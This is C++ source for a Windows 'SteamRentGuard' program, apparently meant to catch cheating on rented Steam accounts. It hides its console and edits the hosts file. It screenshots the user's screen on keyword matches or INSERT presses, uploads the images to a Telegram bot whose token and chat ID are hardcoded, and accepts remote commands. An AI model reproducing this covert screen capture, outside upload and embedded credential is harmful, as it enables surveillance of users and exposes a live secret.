#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <algorithm>
#include <psapi.h>
#include <winhttp.h>
#include <fstream>
#include <thread>
#include <ctime>
#include <shlobj.h>
#include <gdiplus.h> // Для работы со скриншотами

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "gdiplus.lib") // Библиотека для GDI+

using namespace Gdiplus;

// --- НАСТРОЙКИ TELEGRAM ---
std::wstring botToken = L"8706100595:AAGyn5FfVysIOE7dQueOF_tBSPMm4Bb5ZVU";
std::wstring chatId = L"5261385589";

// Прототипы функций
std::string GetFilePath();
std::wstring GetPCName();
void SendToTelegram(std::wstring message);
void SendFileToTelegram(std::wstring filePath); // Новое: отправка фото
void TakeScreenshot(std::wstring filename);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
void Log(std::string text);

// --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ СКРИНШОТА ---
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    std::vector<BYTE> buffer(size);
    ImageCodecInfo* pImageCodecInfo = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(num, size, pImageCodecInfo) != Ok) return -1;
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            return j;
        }
    }
    return -1;
}

void TakeScreenshot(std::wstring filename) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
    Bitmap* b = new Bitmap(hBitmap, NULL);
    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid);
    b->Save(filename.c_str(), &clsid, NULL);
    delete b;
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    GdiplusShutdown(gdiplusToken);
}

// --- ОТПРАВКА ФОТО В ТЕЛЕГРАМ ---
void SendFileToTelegram(std::wstring filePath) {
    HINTERNET hSession = WinHttpOpen(L"SteamRentGuard/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (hConnect) {
        std::wstring url = L"/bot" + botToken + L"/sendPhoto";
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", url.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (hRequest) {
            std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            std::wstring headers = L"Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW";
            std::string bodyHeader = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + std::string(chatId.begin(), chatId.end()) + "\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n";
            std::string bodyFooter = "\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n";
            std::ifstream file(filePath, std::ios::binary);
            if (file.is_open()) {
                std::vector<char> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                std::string fullBody = bodyHeader + std::string(fileData.begin(), fileData.end()) + bodyFooter;
                WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)-1, (LPVOID)fullBody.c_str(), (DWORD)fullBody.size(), (DWORD)fullBody.size(), 0);
                WinHttpReceiveResponse(hRequest, NULL);
            }
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
}

// --- ПУТЬ К ФАЙЛУ С ИМЕНЕМ ---
std::string GetFilePath() {
    char path[MAX_PATH];
    if (SHGetSpecialFolderPathA(NULL, path, CSIDL_MYVIDEO, FALSE)) {
        return std::string(path) + "\\users.txt";
    }
    return "users.txt";
}

std::vector<std::string> blockedSites = {
    "xone.fun", "midnight.im", "interium.ooo", "fatality.win", "neverlose.cc",
    "www.xone.fun", "www.midnight.im", "www.interium.ooo", "www.fatality.win", "www.neverlose.cc"
};

std::vector<std::wstring> cheatTargets = {
    L"exloader", L"com.swiftsoft", L"xone", L"interium", L"skinchanger", L"extrimhack",
    L"nix", L"memesense", L"mvploader", L"sharkhack", L"exhack", L"neverkernel",
    L"vredux", L"mason", L"predator", L"aquila", L"luno", L"fecurity", L"cartel",
    L"aimstar", L"tkazer", L"naim", L"pellix", L"pussycat", L"axios", L"onemacro",
    L"softhub", L"proext", L"sapphire", L"interwebz", L"plague", L"vapehook",
    L"smurfwrecker", L"iniuria", L"yeahnot", L"legendware", L"hauntedproject",
    L"phoenixhack", L"onebyteradar", L"reborn", L"onebyte", L"osiris", L"ev0lve",
    L"ghostware", L"dexterion", L"basicmultihack", L"pudra", L"icheat", L"sneakys",
    L"krazyhack", L"muhprime", L"drcheats", L"rootcheat", L"aeonix", L"zedt.pw",
    L"devcore", L"legifard", L"katebot", L"imxnoobx", L"w1nner", L"ekknod",
    L"neoxahack", L"warware", L"weave", L"aimmy", L"paradise", L"xenon", L"easysp",
    L"en1gma", L"injector", L".ahk", L"macros", L"bhop", L"bunnyhop", L"espd2x",
    L"avira", L"pphud", L"primordial", L"nonagon", L"legit", L"hvh", L"aimbot",
    L"s1mple", L"semirage", L"cheat", L"cs2.glow", L"invision", L"undetek",
    L"spurdo", L"webradar", L"valthrun", L"midnight", L"interium.ooo"
};

std::wstring GetPCName() {
    std::wstring nameFromFile = L"";
    std::wifstream infile(GetFilePath().c_str());
    if (infile.is_open()) {
        if (std::getline(infile, nameFromFile)) {
            if (!nameFromFile.empty()) {
                infile.close();
                return nameFromFile;
            }
        }
        infile.close();
    }
    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(buffer, &size)) return std::wstring(buffer);
    return L"Unknown_PC";
}

void SendToTelegram(std::wstring message) {
    HINTERNET hSession = WinHttpOpen(L"SteamRentGuard/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            std::wstring fullMsg = L"[" + GetPCName() + L"] " + message;
            std::wstring url = L"/bot" + botToken + L"/sendMessage?chat_id=" + chatId + L"&text=";
            for (auto c : fullMsg) {
                if (c == L' ') url += L"%20";
                else if (c == L'\n') url += L"%0A";
                else if (c == L'[') url += L"%5B";
                else if (c == L']') url += L"%5D";
                else url += c;
            }
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
                WinHttpReceiveResponse(hRequest, NULL);
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

void CheckRemoteCommands() {
    HINTERNET hSession = WinHttpOpen(L"SteamRentGuard/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            std::wstring url = L"/bot" + botToken + L"/getUpdates?offset=-1&limit=5";
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest && WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                if (WinHttpReceiveResponse(hRequest, NULL)) {
                    DWORD dwSize = 0; WinHttpQueryDataAvailable(hRequest, &dwSize);
                    if (dwSize > 0) {
                        std::string res(dwSize, 0); DWORD dwRead = 0;
                        WinHttpReadData(hRequest, &res[0], dwSize, &dwRead);
                        size_t pos = res.find("SET_NAME:");
                        if (pos != std::string::npos) {
                            size_t fC = res.find(':', pos); size_t sC = res.find(':', fC + 1); size_t end = res.find('"', sC + 1);
                            std::string target = res.substr(fC + 1, sC - fC - 1);
                            std::string newN = res.substr(sC + 1, end - sC - 1);
                            std::wstring curW = GetPCName(); std::string cur(curW.begin(), curW.end());
                            if (target == cur) {
                                std::wofstream out(GetFilePath().c_str(), std::ios::trunc);
                                if (out.is_open()) {
                                    std::wstring wNew(newN.begin(), newN.end());
                                    out << wNew; out.close();
                                    SendToTelegram(L"✅ Имя успешно обновлено!");
                                }
                            }
                        }
                    }
                }
            }
            if (hRequest) WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

void RegisterPCInFile() {
    wchar_t buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(buffer, &size)) {
        std::wstring currentPC(buffer);
        std::vector<std::wstring> existingUsers;
        std::wstring line;
        std::wifstream infile(GetFilePath().c_str());
        if (infile.is_open()) {
            while (std::getline(infile, line)) if (!line.empty()) existingUsers.push_back(line);
            infile.close();
        }
        bool found = false;
        for (const auto& user : existingUsers) if (user == currentPC) { found = true; break; }
        if (!found) {
            std::wofstream outfile(GetFilePath().c_str(), std::ios_base::app);
            if (outfile.is_open()) { outfile << currentPC << L"\n"; outfile.close(); }
        }
    }
}

void Log(std::string text) {
    time_t now = time(0);
    tm ltm;
    localtime_s(&ltm, &now);
    printf("[%02d:%02d:%02d] %s\n", ltm.tm_hour, ltm.tm_min, ltm.tm_sec, text.c_str());
}

void BlockCheatSites() {
    std::ofstream hostsFile;
    hostsFile.open("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::app);
    if (hostsFile.is_open()) {
        hostsFile << "\n# SteamRentGuard Block\n";
        for (const auto& site : blockedSites) hostsFile << "127.0.0.1 " << site << "\n";
        hostsFile.close();
        system("ipconfig /flushdns >nul 2>&1");
        Log("Сетевой фильтр: Сайты заблокированы.");
    }
    else Log("!!! ОШИБКА: Запустите от имени АДМИНИСТРАТОРА !!!");
}

void AutoStatusThread() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(30000));
        SendToTelegram(L"🟢 СТАТУС: Пользователь не закрыл защиту");
    }
}

// НОВАЯ ФУНКЦИЯ: Мгновенное отслеживание INSERT в отдельном потоке
void InstantKeyThread() {
    while (true) {
        if (GetAsyncKeyState(VK_INSERT) & 0x8000) {
            std::wstring screenPath = L"C:\\Windows\\Temp\\ins_instant.jpg";
            TakeScreenshot(screenPath);
            SendFileToTelegram(screenPath);
            _wremove(screenPath.c_str());
            std::this_thread::sleep_for(std::chrono::milliseconds(300)); // Защита от спама
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Частота проверки
    }
}

void PrintLogo() {
    system("cls");
    system("color 0B");
    std::wcout << L"############################################################" << std::endl;
    std::wcout << L"#                                                          #" << std::endl;
    std::wcout << L"#                  SteamRentGuard SECURITY 1.0             #" << std::endl;
    std::wcout << L"#            СТАТУС: АКТИВНЫЙ МОНИТОРИНГ [ПОЛНЫЙ СПИСОК]    #" << std::endl;
    std::wcout << L"############################################################" << std::endl;
}

std::wstring GetFullProcessPath(DWORD pid) {
    wchar_t path[MAX_PATH] = L"Неизвестный путь";
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess) {
        DWORD size = MAX_PATH;
        if (!QueryFullProcessImageNameW(hProcess, 0, path, &size)) GetModuleFileNameExW(hProcess, NULL, path, MAX_PATH);
        CloseHandle(hProcess);
    }
    return std::wstring(path);
}

// --- ГЛАВНОЕ ДЕЙСТВИЕ ПРИ УГРОЗЕ (ОБНОВЛЕНО) ---
void SecurityAction(std::wstring name, std::wstring path, DWORD pid = 0) {
    Log("!!! ВНИМАНИЕ: ОБНАРУЖЕНА УГРОЗА !!!");

    // 1. Делаем скриншот
    std::wstring screenPath = L"C:\\Windows\\Temp\\evidence.jpg";
    TakeScreenshot(screenPath);

    // 2. Отправляем скриншот в ТГ
    SendFileToTelegram(screenPath);

    // 3. Удаляем скриншот с диска
    _wremove(screenPath.c_str());

    // 4. Убиваем процесс угрозы
    if (pid != 0) {
        HANDLE hKill = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hKill) { TerminateProcess(hKill, 9); CloseHandle(hKill); }
    }

    // 5. Закрываем Steam и игры
    system("taskkill /F /IM cs2.exe /T >nul 2>&1");
    system("taskkill /F /IM steam.exe /T >nul 2>&1");
    system("taskkill /F /IM steamwebhelper.exe /T >nul 2>&1");

    // 6. Информируем в чат
    SendToTelegram(L"🚨 УГРОЗА ЛИКВИДИРОВАНА!\n🔹 Объект: " + name + L"\n📍 Путь: " + path + L"\n📸 Скриншот отправлен.");

    MessageBoxW(NULL, L"Угроза зафиксирована! Steam закрыт.", L"SteamRentGuard", MB_ICONERROR | MB_OK);
    exit(0);
}

void ScanDirectory(std::wstring folderPath, std::wstring label) {
    WIN32_FIND_DATAW findData;
    std::wstring searchPath = folderPath + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                std::wstring dirName = findData.cFileName;
                if (dirName == L"." || dirName == L"..") continue;
                std::wstring lowerDir = dirName;
                std::transform(lowerDir.begin(), lowerDir.end(), lowerDir.begin(), ::tolower);
                for (const auto& target : cheatTargets) {
                    if (lowerDir.find(target) != std::wstring::npos) {
                        SecurityAction(L"Запрещенная папка (" + label + L")", folderPath + L"\\" + dirName);
                    }
                }
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
}

void ScanRootC() { ScanDirectory(L"C:", L"Root C"); }
void ScanAppData() {
    wchar_t path[MAX_PATH];
    if (SHGetSpecialFolderPathW(NULL, path, CSIDL_APPDATA, FALSE)) ScanDirectory(path, L"Roaming");
}
void ScanLocalAppData() {
    wchar_t path[MAX_PATH];
    if (SHGetSpecialFolderPathW(NULL, path, CSIDL_LOCAL_APPDATA, FALSE)) ScanDirectory(path, L"Local");
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    wchar_t title[512];
    if (GetWindowTextW(hwnd, title, 512)) {
        std::wstring wsTitle(title);
        std::transform(wsTitle.begin(), wsTitle.end(), wsTitle.begin(), ::tolower);
        for (const auto& target : cheatTargets) if (wsTitle.find(target) != std::wstring::npos) SecurityAction(L"Запрещенное окно", wsTitle);
    }
    return TRUE;
}

int main() {
    system("chcp 1251 > nul");
    setlocale(LC_ALL, "Russian");

    RegisterPCInFile();
    PrintLogo();
    Log("Запуск системы...");
    BlockCheatSites();

    Log("Скрытие консоли...");
    HWND hConsole = GetConsoleWindow();
    long style = GetWindowLong(hConsole, GWL_EXSTYLE);
    style |= WS_EX_TOOLWINDOW; style &= ~WS_EX_APPWINDOW;
    SetWindowLong(hConsole, GWL_EXSTYLE, style);

    std::thread statusThread(AutoStatusThread);
    statusThread.detach();

    // ЗАПУСК ПОТОКА КНОПКИ (добавлено для мгновенного отклика)
    std::thread keyThread(InstantKeyThread);
    keyThread.detach();

    SendToTelegram(L"✅ ЗАЩИТА ВКЛЮЧЕНА [0.53 BETA]");

    int diskScanTimer = 0;
    while (true) {
        CheckRemoteCommands();

        // Старую проверку в цикле оставляем (как ты просил ничего не менять), 
        // но теперь она дублируется мгновенным потоком выше.
        if (GetAsyncKeyState(VK_INSERT) & 0x8000) {
            std::wstring screenPath = L"C:\\Windows\\Temp\\ins.jpg";
            TakeScreenshot(screenPath);
            SendFileToTelegram(screenPath);
            _wremove(screenPath.c_str());
        }

        if (diskScanTimer % 7 == 0) {
            ScanRootC();
            ScanAppData();
            ScanLocalAppData();
        }
        diskScanTimer++;

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(pe);
            if (Process32FirstW(hSnapshot, &pe)) {
                do {
                    std::wstring currentProc(pe.szExeFile);
                    std::transform(currentProc.begin(), currentProc.end(), currentProc.begin(), ::tolower);
                    for (const auto& target : cheatTargets) {
                        if (currentProc.find(target) != std::wstring::npos) {
                            SecurityAction(currentProc, GetFullProcessPath(pe.th32ProcessID), pe.th32ProcessID);
                        }
                    }
                } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }
        EnumWindows(EnumWindowsProc, NULL);
        Sleep(300);
    }
    return 0;
}